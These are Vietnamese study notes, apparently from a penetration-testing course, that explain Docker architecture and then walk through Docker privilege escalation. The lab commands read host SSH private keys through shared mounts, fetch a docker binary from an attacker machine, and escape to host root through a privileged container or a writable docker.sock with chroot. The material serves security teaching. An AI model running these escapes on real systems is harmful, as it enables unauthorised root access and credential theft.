Docker là một công cụ mã nguồn mở phổ biến, cung cấp runtime environment có tính portable và nhất quán cho các software application. Docker sử dụng containers như những môi trường isolated trong user space. chạy ở cấp độ operating system và dùng chung file system cùng system resources. Một ưu điểm là containerization tiêu thụ ít tài nguyên hơn đáng kể so với server hoặc virtual machine truyền thống.
Tính năng cốt lõi của Docker là các application được đóng gói bên trong những thành phần được gọi là Docker containers. Do đó, Docker container là một lightweight standalone executable software package, chứa mọi thứ cần thiết để chạy một application code runtime.
## Docker Architecture
Trọng tâm của Docker architechture là client-server model, trong đó chúng ta có hai thành phần chính: 
- docker daemon
- docker client. 
Docker client đóng vai trò là interface để chúng ta gửi commands và tương tác với Docker ecosystem, trong khi Docker daemon chịu trách nhiệm thực thi các commands đó và quản lý containers.
#### Docker Daemon
Docker Daemon, còn được gọi là docker server, là một thành phần quan trọng của Docker platform và đóng vai trò then chốt trong việc container management và orchestration.
Có thể xem Docker Daemon là thành phần xử lý chính phía sau Docker. Nó có một số trách nhiệm thiết yếu như:
- running Docker containers.
- interacting with Docker container.
- managing Docker containers trên host system.
#### Managing Docker Containers
Docker Daemon xử lý các chức năng cốt lõi của containerization. Nó điều phối việc tạo, thực thi và monitoring Docker containers, đồng thời duy trì sự isolation của chúng khỏi host và các containers khác. Isolation này đảm bảo rằng các container hoạt động độc lập với file systems, processes và network interfaces riêng.
Ngoài ra, nó còn xử lý Docker image management. Nó pull images từ các registeries như Docker Hub hoặc private repositories và lưu trữ chúng locally. Những images này đóng vai trò là các building blocks để tạo containers.
Docker Daemon cũng cung cấp monitoring và loggin capabilities ví dụ:
- Captures container logs
- Cung cấp thông tin về các hoạt động của container, errors và debugging information.
Daemon cũng monitoring resource utilization như CPU, memory và network usage, cho phép chúng ta tối ưu hóa container performance và troubleshoots các vấn đề.
#### Network and Storage
Docker Daemon hỗ trợ container networking bằng cách tạo virtual networks và quản lý network interfaces. Nó cho phép các containers giao tiếp với nhau và với bên ngoài thông qua network ports, IP addresses, và DNS resolution.
Docker Daemon cũng đóng vai trò quan trọng trong storage management vì nó xử lý Docker volumes. Các volumes được sử dụng để duy trì dữ liệu vượt qua vòng đời của containers. 
Docker Daemon quản lý việc tạo, attachment và clean-up volumes, cho phép các containers chia sẻ hoặc lưu trữ dữ liệu độc lập với nhau.
#### Docker Clients
Khi tương tác với Docker, chúng ta gửi commands thông qua `Docker Client`. Docker Client giao tiếp với Docker Daemon thông qua `RESTful API` hoặc `Unix Socket` và đóng vai trò là phương thức chính để chúng ta tương tác với Docker.
Chúng ta cũng có khả năng create, start, stop, manage và remove containers cũng như search và download Docker images.
Chúng ta cũng có khả năng push images của mình lên remote repositories, hỗ trợ collaboration và sharing trong team hoặc với wider community. Ngược lại, Daemon sẽ thực hiện các actions được yêu cầu, đảm bảo containers được created, launched, stopped và removed theo yêu cầu. Một client khác của Docker là `Docker Compose`. Đây là một công cụ giúp đơn giản hóa việc orchestration của nhiều Docker containers dưới dạng một application duy nhất. Nó cho phép chúng ta định nghĩa multi-container architecture của application bằng một file `YAML` (`.yaml`/`.yml`) theo phương thức declarative. Với Docker Compose, chúng ta có thể chỉ định các services cấu thành application, dependencies của chúng và configurations tương ứng. Chúng ta định nghĩa container images, environment variables, networking, volume bindings và các settings khác. Docker Compose sau đó đảm bảo rằng tất cả các containers được định nghĩa sẽ được launched và interconnected, tạo thành một cohesive và scalable application stack.
#### Docker Desktop
Docker Desktop có sẵn trên các operating system MacOS, Windows, và Linux, đồng thời cung cấp một user-friendly GUI giúp đơn giản hóa việc quản lý container và các components của chúng. 
Điều này cho phép chúng ta monitoring trạng thái các containers, inspecting logs và quản lý các resources được cấp phát cho Docker.
Nó cung cấp một phương thức trực quan và intuitive để tương tác với Docker ecosystem, giúp Docker dễ tiếp cận đối với dev ở mọi mức độ. Ngoài ra, Docker Desktop còn hỗ trợ Kubernetes.
## Docker Images and Containers
Hãy xem một `Docker image` như một blueprint hoặc template để tạo containers. Nó đóng gói mọi thứ cần thiết để chạy một application, bao gồm application code, dependencies, libraries và configurations. Một image là một self-contained, read-only package, đảm bảo tính consistency và reproducibility giữa các environments khác nhau. Chúng ta có thể tạo images bằng một text file được gọi là Dockerfile. File này định nghĩa các steps và instructions để build image. 
Một `Docker container` là một instance của Docker image. Đây là một lightweight, isolated và executable environment dùng để chạy applications. Khi chúng ta launch một container, container đó được tạo từ một image cụ thể và kế thừa tất cả properties cùng configurations được định nghĩa trong image đó. Mỗi container hoạt động độc lập, với filesystem, processes và network interfaces riêng. Isolation này đảm bảo rằng các applications bên trong containers được tách biệt khỏi underlying host system và các containers khác, ngăn chặn conflicts và interference.
Trong khi `images` là immutable và `read-only`, `containers` là mutable và `can be modified` trong quá trình runtime.
Chúng ta có thể tương tác với containers, execute commands bên trong chúng, monitoring logs và thậm chí thực hiện thay đổi đối với filesystem hoặc environment của chúng.
Tuy nhiên, mọi modifications được thực hiện đối với filesystem của container sẽ không được persisted trừ khi chúng được lưu rõ ràng dưới dạng một image mới hoặc được lưu trữ trong một persistent volume.
## Docker Privilege Escalation
Có thể xảy ra trường hợp chúng ta giành được quyền truy cập vào một môi trường trong đó phát hiện các user có quyền quản lý Docker container. Khi đó, chúng ta có thể tìm cách tận dụng các Docker container này để đạt được quyền cao hơn trên target system. Chúng ta có thể sử dụng nhiều phương pháp và kỹ thuật khác nhau để leo thang đặc quyền trên host hoặc thực hiện kỹ thuật thoát khỏi container (container escape).
#### Docker Shared Directories
Khi sử dụng Docker, các thư mục chia sẻ (shared directories / volume mounts) có thể tạo cầu nối giữa host system và filesystem của container. Thông qua các thư mục được chia sẻ, những thư mục hoặc file cụ thể trên host có thể được cung cấp quyền truy cập từ bên trong container. Điều này đặc biệt hữu ích trong việc duy trì dữ liệu, chia sẻ code và hỗ trợ cộng tác giữa các môi trường phát triển và Docker container. Tuy nhiên, việc này luôn phụ thuộc vào cách môi trường được thiết lập cũng như mục tiêu mà administrator muốn đạt được. Để tạo một thư mục được chia sẻ, chúng ta chỉ định một đường dẫn trên host system và một đường dẫn tương ứng bên trong container, từ đó tạo ra một liên kết trực tiếp giữa hai vị trí.
Các thư mục được chia sẻ mang lại nhiều lợi ích, bao gồm khả năng duy trì dữ liệu ngay cả khi vòng đời của container kết thúc, đơn giản hóa việc chia sẻ code và phát triển, cũng như hỗ trợ cộng tác trong team. Cần lưu ý rằng các thư mục được chia sẻ có thể được mount ở chế độ `read-only` hoặc `read-write`, tùy thuộc vào yêu cầu cụ thể của administrator. Khi được mount ở chế độ `read-only`, các thay đổi được thực hiện bên trong container sẽ không ảnh hưởng đến host system. Điều này hữu ích khi chỉ cần quyền truy cập read-only để tránh những thay đổi ngoài ý muốn.
Khi có quyền truy cập vào Docker container và thực hiện enumeration cục bộ, chúng ta có thể phát hiện thêm các thư mục (không theo chuẩn) trên filesystem của Docker.
![[Pasted image 20260910202941.png]]

```shell
root@container:~$ cd /hostsystem/home/cry0l1t3 
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw------- 1 cry0l1t3 cry0l1t3 12559 Jun 30 15:09 .bash_history 
-rw-r--r-- 1 cry0l1t3 cry0l1t3   220 Jun 30 15:09 .bash_logout 
-rw-r--r-- 1 cry0l1t3 cry0l1t3  3771 Jun 30 15:09 .bashrc 
drwxr-x--- 10 cry0l1t3 cry0l1t3  4096 Jun 30 15:09 .ssh 

root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa 

-----BEGIN RSA PRIVATE KEY----- 
<SNIP>
```

Từ đây, chúng ta có thể sao chép nội dung của SSH private key vào một tệp (ví dụ `cry0l1t3.priv`), phân quyền phù hợp (`chmod 600`) và sử dụng nó để đăng nhập thông qua SSH với tư cách người dùng `cry0l1t3` trên host system:

```shell
w3bis2bi@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

#### Docker Sockets
`Docker socket` (hoặc `Docker daemon socket`) là một tệp đặc biệt cho phép người dùng và các tiến trình giao tiếp trực tiếp với Docker daemon. Quá trình giao tiếp này diễn ra thông qua Unix socket hoặc network socket, tùy thuộc vào cấu hình của hệ thống Docker. Nó đóng vai trò là cầu nối trung gian giữa Docker client và Docker daemon. Khi chúng ta thực thi một câu lệnh qua Docker CLI, Docker client sẽ gửi lệnh đó đến Docker socket; từ đó Docker daemon sẽ tiếp nhận, xử lý và thực thi các hành vi tương ứng được yêu cầu.

Tuy nhiên, Docker socket đòi hỏi các quyền truy cập phù hợp nhằm đảm bảo giao tiếp an toàn và ngăn chặn truy cập trái phép. Quyền truy cập vào Docker socket thông thường bị giới hạn cho những người dùng hoặc nhóm người dùng nhất định, đảm bảo chỉ các cá nhân đáng tin cậy mới có thể gửi chỉ thị và tương tác với Docker daemon. Khi Docker socket được expose qua một network interface, chúng ta có thể quản lý từ xa các Docker host, gửi commands và kiểm soát toàn bộ containers cùng tài nguyên liên quan. Khả năng truy cập API từ xa này mở rộng tính linh hoạt trong các kiến trúc phân tán. Mặc dù vậy, tùy vào cách cấu hình của hệ thống, container có thể chứa các automated processes hoặc các tác vụ định kỳ lưu trữ thông tin nhạy cảm hữu ích, tạo tiền đề để chúng ta thực hiện kỹ thuật container escape:

```shell
htb-student@container:~/app$ ls -al 

total 8 
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 . 
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 .. 
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Từ vị trí này, chúng ta có thể sử dụng Docker binary để tương tác trực tiếp với socket và kiểm tra (enumerate) danh sách các container đang chạy. Nếu bên trong container chưa có sẵn Docker binary, chúng ta có thể tải về từ máy tấn công hoặc repository chính thức và chuyển vào container:

```shell
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker 
htb-student@container:/tmp$ chmod +x docker 
htb-student@container:/tmp$ ls -l 

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker 

htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps 

CONTAINER ID   IMAGE      COMMAND                  CREATED        STATUS              PORTS     NAMES 
3fe8a4782311   main_app   "/docker-entry.s..."     3 days ago     Up 12 minutes       443/tcp   app 
<SNIP>
```

Chúng ta có thể tự khởi tạo một Docker container mới với tham số ánh xạ toàn bộ thư mục gốc (`/`) của host system vào thư mục `/hostsystem` bên trong container. Kết hợp với cờ `--privileged`, chúng ta sẽ giành được toàn quyền truy cập vào filesystem của host. Để thực hiện điều này, cần ánh xạ các thư mục tương ứng và sử dụng một Docker image có sẵn trên hệ thống (ở đây là `main_app`):

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app 

htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps 

CONTAINER ID   IMAGE      COMMAND                  CREATED          STATUS              PORTS     NAMES 
7ae3bcc818af   main_app   "/docker-entry.s..."     12 seconds ago   Up 8 seconds        443/tcp   app 
3fe8a4782311   main_app   "/docker-entry.s..."     3 days ago       Up 17 minutes       443/tcp   app 
<SNIP>
```

Bây giờ, chúng ta có thể truy cập vào phiên shell của container đặc quyền mới tạo với ID `7ae3bcc818af` và điều hướng đến thư mục `/hostsystem`:

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash 

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa 

-----BEGIN RSA PRIVATE KEY----- 
<SNIP>
```

Từ đây, chúng ta lại có thể trích xuất SSH private key của `root` (hoặc của bất kỳ người dùng nào trên hệ thống có SSH private key trong thư mục cá nhân) để đăng nhập và kiểm soát hoàn toàn host system.

#### Docker Group
Để đạt được quyền `root` thông qua Docker, tài khoản người dùng mà chúng ta đang đăng nhập trên host system phải là thành viên của nhóm `docker`. Điều này cho phép người dùng có quyền giao tiếp và điều khiển trực tiếp Docker daemon mà không cần `sudo`:

```shell
docker-user@nix02:~$ id 

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Ngoài ra, binary `docker` có thể được gắn cờ `SUID`, hoặc tài khoản hiện tại được định nghĩa trong file `sudoers` cho phép chạy `docker` dưới quyền root. Cả ba trường hợp này đều cho phép chúng ta tương tác với Docker để phục vụ mục đích leo thang đặc quyền.

Hầu hết các host đều có kết nối Internet trực tiếp vì cần tải về các base image và container. Tuy nhiên, nhiều hệ thống có thể bị ngắt kết nối Internet vào ban đêm hoặc ngoài giờ làm việc vì các lý do an ninh. Mặc dù vậy, nếu các host này nằm trong một phân vùng mạng mà các dịch vụ (ví dụ web server) bắt buộc phải đi qua, chúng vẫn có thể được tiếp cận.

Để kiểm tra danh sách các Docker image hiện có trên hệ thống mà chúng ta có quyền truy cập, sử dụng lệnh:
```shell
docker-user@nix02:~$ docker image ls 

REPOSITORY   TAG       IMAGE ID       CREATED      SIZE 
ubuntu       20.04     20fffa419e3a   2 days ago   72.8MB
```
#### Writable Docker Socket
Một tình huống khác cũng có thể xảy ra là khi Docker socket bị cấu hình sai quyền hạn và cho phép quyền ghi (`writable`). Thông thường, socket này nằm tại `/var/run/docker.sock` (vị trí có thể thay đổi tùy thuộc vào cấu hình hệ thống). Theo nguyên tắc bảo mật, tệp này chỉ có thể được ghi bởi người dùng `root` hoặc nhóm `docker`. Tuy nhiên, nếu chúng ta hoạt động dưới danh nghĩa một người dùng không thuộc hai nhóm này nhưng Docker socket vẫn mở quyền ghi cho tất cả (`world-writable`), chúng ta vẫn có thể tận dụng cấu hình sai này để leo thang đặc quyền.
Khai thác bằng cách khởi chạy container từ một image có sẵn (ví dụ `ubuntu`), mount toàn bộ thư mục gốc (`/`) của host system vào thư mục `/mnt` của container, sau đó thực thi lệnh `chroot /mnt bash` để chuyển đổi root filesystem của phiên làm việc về chính filesystem của host:
```shell
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash 

root@ubuntu:~# ls -l

total 68 
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin 
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot 
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom 
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev 
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc 
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home 
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib 
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32 
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64 
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32 
drwx------   2 root root 16384 Oct  6  2021 lost+found 
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media 
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt 
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt 
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc 
drwx------   6 root root  4096 Sep 26 21:11 root 
drwxr-xr-x  28 root root   920 Oct 24 13:32 run 
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin 
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap 
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv 
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys 
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp 
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr 
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```
Lúc này, chúng ta đã có một phiên shell với toàn quyền `root` trực tiếp trên filesystem của host system và hoàn tất quá trình leo thang đặc quyền.
![[Pasted image 20260910205628.png]]

![[Pasted image 20260910205547.png]]

![[Pasted image 20260910205607.png]]

![[Pasted image 20260910205808.png]]

![[Pasted image 20260910210010.png]]

![[Pasted image 20260910210317.png]]